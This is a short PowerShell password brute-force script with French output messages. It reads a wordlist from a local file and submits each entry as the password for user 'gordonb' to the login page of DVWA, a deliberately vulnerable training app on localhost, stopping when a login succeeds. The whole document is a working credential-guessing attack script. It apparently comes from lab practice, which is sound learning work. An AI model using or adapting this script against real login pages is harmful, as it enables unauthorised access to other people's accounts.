# brut force

$passwords = get-content -path "C:\Users\Flof\Desktop\script\pass.txt"

$url = "http://localhost/dvwa/login.php"

foreach ($password in $passwords) {
    $body = @{
        username = 'gordonb'
        password = $password
        Login = 'Login'
            }

$LoginResponse = Invoke-WebRequest $url -Body $Body -Method 'POST'

    if ($Loginresponse.Content -like "*login failed*") {
        echo "pas bon"
        }
    else {
    echo "le mot de passe est:" $password
    break
    }
}
